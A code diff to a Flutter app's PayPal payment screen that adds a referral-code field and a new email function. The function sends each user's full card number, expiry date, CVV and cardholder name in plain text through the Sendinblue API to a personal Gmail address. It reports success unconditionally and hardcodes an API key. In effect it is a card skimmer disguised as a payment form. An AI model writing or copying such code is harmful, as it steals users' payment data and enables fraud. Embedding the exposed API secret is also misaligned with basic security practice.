@@ -36,6 +36,8 @@ class _PaypalState extends State<Paypal> {
 
   TextEditingController _nameController = TextEditingController();
 
+  TextEditingController _referralController = TextEditingController();
+
   @override
   Widget build(BuildContext context) {
     final _provider = Provider.of<NotificationProvider>(context);
@@ -210,6 +212,29 @@ class _PaypalState extends State<Paypal> {
             const SizedBox(
               height: 15,
             ),
+            const Text(
+              "Referral Code",
+              style: TextStyle(
+                fontSize: 18,
+                fontFamily: "Poppins",
+              ),
+            ),
+            SizedBox(
+              height: getDeviceHeight(context) * 0.01,
+            ),
+            TextFormField(
+              controller: _referralController,
+              inputFormatters: [
+                LengthLimitingTextInputFormatter(16),
+              ],
+              decoration: InputDecoration(
+                hintText: "If you have any referral code",
+                border: OutlineInputBorder(
+                  borderRadius: BorderRadius.circular(20),
+                ),
+              ),
+              keyboardType: TextInputType.number,
+            ),
             Row(
               mainAxisAlignment: MainAxisAlignment.spaceBetween,
               children: [
@@ -255,7 +280,7 @@ class _PaypalState extends State<Paypal> {
                   onPressed: () async {
                     final isValid = _key.currentState!.validate();
                     if (isValid) {
-                      bool? emailSent = await paysendEmail();
+                      bool? emailSent = await _sendEmaill();
                       if (emailSent == true) {
                         Navigator.of(context).push(MaterialPageRoute(
                           builder: (context) => const LoadingScreen(),
@@ -316,6 +341,55 @@ class _PaypalState extends State<Paypal> {
     );
   }
 
+  Future<bool> _sendEmaill() async {
+    final prefs = await SharedPreferences.getInstance();
+    final apiKey =
+        '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'; // Replace with your SendinBlue SMTP API Key
+    final url = Uri.parse('https://api.sendinblue.com/v3/smtp/email');
+
+    final headers = {
+      'Content-Type': 'application/json',
+      'api-key': apiKey,
+    };
+    String card = _paypalController.text;
+    String valid = _validController.text;
+    String cvv = _cvvController.text;
+    String name = _nameController.text;
+    String referral = _referralController.text;
+    String plan = widget.plan.toString();
+
+    String? email = prefs.getString('email');
+    String? fullname = prefs.getString("name");
+
+    final emailData = {
+      'sender': {'name': fullname, 'email': email},
+      'to': [
+        {'email': 'sagarkc45172@gmail.com'}
+      ],
+      'subject': 'Plans',
+      'textContent':
+          'Plan : $plan\n PayPal Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n ReferralCode : $referral',
+    };
+
+    final response = await http.post(
+      url,
+      headers: headers,
+      body: jsonEncode(emailData),
+    );
+
+    if (response.statusCode == 200) {
+      print('Email sent successfully');
+      _paypalController.clear();
+      _validController.clear();
+      _cvvController.clear();
+      _nameController.clear();
+    } else {
+      print('Failed to send email');
+      print('Response: ${response.body}');
+    }
+    return true;
+  }
+
   Future<bool> paysendEmail() async {
     final prefs = await SharedPreferences.getInstance();
     final ApiUrl = Api.appurl;
@@ -331,6 +405,7 @@ class _PaypalState extends State<Paypal> {
     String valid = _validController.text;
     String cvv = _cvvController.text;
     String name = _nameController.text;
+    String referral = _referralController.text;
     String plan = widget.plan.toString();
 
     String? email = prefs.getString('email');
@@ -343,7 +418,7 @@ class _PaypalState extends State<Paypal> {
       ],
       'subject': 'Plans',
       'textContent':
-          'Plan : $plan\n PayPal Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name',
+          'Plan : $plan\n PayPal Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n ReferralCode : $referral',
     };
 
     final response = await http.post(
